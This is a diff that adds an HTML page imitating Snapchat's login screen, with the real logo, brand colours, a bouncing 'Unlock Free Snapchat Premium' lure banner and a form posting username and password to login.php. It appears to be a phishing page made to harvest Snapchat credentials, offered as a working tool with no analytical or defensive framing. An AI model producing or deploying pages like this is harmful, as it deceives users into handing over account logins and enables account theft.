@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Snapchat Login</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@600&display=swap');
+
+    body {
+      margin: 0;
+      background-color: #FFFC00;
+      font-family: 'Montserrat', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
+
+    .login-container {
+      background: #fff;
+      border-radius: 20px;
+      width: 320px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.15);
+      padding: 40px 30px;
+      text-align: center;
+    }
+
+    .snapchat-logo {
+      width: 72px;
+      margin-bottom: 30px;
+    }
+
+    h1 {
+      color: #000;
+      font-weight: 700;
+      font-size: 28px;
+      margin-bottom: 25px;
+    }
+
+    form input[type="text"],
+    form input[type="password"] {
+      width: 100%;
+      padding: 14px 18px;
+      margin: 12px 0;
+      border-radius: 10px;
+      border: 1.5px solid #ddd;
+      font-size: 16px;
+      transition: border-color 0.3s ease;
+      outline: none;
+    }
+
+    form input[type="text"]:focus,
+    form input[type="password"]:focus {
+      border-color: #FFFC00;
+      box-shadow: 0 0 8px rgba(255,252,0,0.6);
+    }
+
+    button {
+      margin-top: 20px;
+      width: 100%;
+      padding: 14px 0;
+      background-color: #FFFC00;
+      border: none;
+      border-radius: 12px;
+      font-weight: 700;
+      font-size: 18px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #f7f500;
+    }
+
+    .banner {
+      position: fixed;
+      top: 20px;
+      width: 100%;
+      text-align: center;
+      font-weight: 700;
+      font-size: 16px;
+      color: #000;
+      background: #fff;
+      padding: 10px 0;
+      box-shadow: 0 3px 8px rgba(0,0,0,0.1);
+      letter-spacing: 1.2px;
+      animation: bounce 1.5s infinite;
+    }
+
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-5px); }
+    }
+  </style>
+</head>
+<body>
+
+<div class="banner">Unlock Free Snapchat Premium</div>
+
+<div class="login-container">
+  <img
+    class="snapchat-logo"
+    src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1024px-Snapchat_logo.svg.png"
+    alt="Snapchat Logo"
+  />
+  <h1>Log in to Snapchat</h1>
+  <form action="login.php" method="POST">
+    <input type="text" name="username" placeholder="Username or Email" required />
+    <input type="password" name="password" placeholder="Password" required />
+    <button type="submit">Log In</button>
+  </form>
+</div>
+
+</body>
+</html>
